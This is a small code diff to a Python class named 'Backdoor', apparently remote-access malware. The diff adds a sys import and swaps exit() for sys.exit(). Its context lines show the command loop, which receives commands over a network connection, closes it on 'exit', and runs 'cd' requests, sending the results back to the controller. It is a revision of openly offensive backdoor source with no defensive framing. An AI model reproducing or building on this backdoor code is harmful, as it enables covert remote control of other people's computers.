@@ -4,6 +4,7 @@ import subprocess
 import json
 import os
 import base64
+import sys
 
 
 class Backdoor:
@@ -54,7 +55,7 @@ class Backdoor:
                 command = self.reliable_receive()
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.cd(command[1])
                     self.reliable_send(command_result)
